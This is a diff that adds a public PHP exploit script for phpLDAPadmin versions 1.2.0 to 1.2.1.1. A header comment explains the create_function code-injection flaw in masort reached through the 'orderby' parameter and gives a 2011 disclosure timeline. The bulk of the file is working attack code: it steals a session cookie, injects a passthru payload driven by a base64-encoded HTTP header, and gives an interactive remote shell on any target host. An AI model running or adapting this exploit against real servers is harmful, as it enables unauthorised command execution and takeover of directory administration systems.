@@ -1,0 +1,112 @@
+<?php
+
+/*
+    ------------------------------------------------------------------------
+    phpLDAPadmin <= 1.2.1.1 (query_engine) Remote PHP Code Injection Exploit
+    ------------------------------------------------------------------------
+    
+    author...............: EgiX
+    mail.................: n0b0d13s[at]gmail[dot]com
+    software link........: http://phpldapadmin.sourceforge.net/
+    affected versions....: from 1.2.0 to 1.2.1.1
+
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] vulnerable code in /lib/functions.php
+    
+    1002.    function masort(&$data,$sortby,$rev=0) {
+    1003.        if (defined('DEBUG_ENABLED') && DEBUG_ENABLED && (($fargs=func_get_args())||$fargs='NOARGS'))
+    1004.            debug_log('Entered (%%)',1,0,__FILE__,__LINE__,__METHOD__,$fargs);
+    1005.    
+    1006.        # if the array to sort is null or empty
+    1007.        if (! $data) return;
+    1008.    
+    1009.        static $CACHE = array();
+    1010.    
+    1011.        if (empty($CACHE[$sortby])) {
+    1012.            $code = "\$c=0;\n";
+    1013.    
+    1014.            foreach (explode(',',$sortby) as $key) {
+    1015.                $code .= "if (is_object(\$a) || is_object(\$b)) {\n";
+    1016.    
+    1017.                $code .= "    if (is_array(\$a->$key)) {\n";
+    1018.                $code .= "        asort(\$a->$key);\n";
+    1019.                $code .= "        \$aa = array_shift(\$a->$key);\n";
+    
+    ....
+    
+    1078.            $code .= 'return $c;';
+    1079.    
+    1080.            $CACHE[$sortby] = create_function('$a, $b',$code);
+    1081.        }
+    
+    The $sortby parameter passed to 'masort' function isn't properly sanitized before being used in a call to create_function()
+    at line 1080, this can be exploited to inject and execute arbitrary PHP code. The only possible attack vector is when handling
+    the 'query_engine' command, here input passed through $_REQUEST['orderby'] is passed as $sortby parameter to 'masort' function.
+    
+    [-] Disclosure timeline:
+    
+    [30/09/2011] - Vulnerability discovered
+    [02/10/2011] - Issue reported to http://sourceforge.net/support/tracker.php?aid=3417184
+    [05/10/2011] - Fix committed: http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;h=76e6dad
+    [23/10/2011] - Public disclosure
+    
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No response from {$host}:80\n");
+
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+-------------------------------------------------------------------+";
+print "\n| phpLDAPadmin <= 1.2.1.1 Remote PHP Code Injection Exploit by EgiX |";
+print "\n+-------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /phpldapadmin/htdocs/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$packet  = "GET {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+if (!preg_match("/Set-Cookie: ([^;]*);/", http_send($host, $packet), $sid)) die("\n[-] Session ID not found!\n");
+
+$phpcode = "foo));}}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;/*";
+$payload = "cmd=query_engine&query=none&search=1&orderby={$phpcode}";
+
+$packet  = "POST {$path}cmd.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+while(1)
+{
+    print "\nphpldapadmin-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
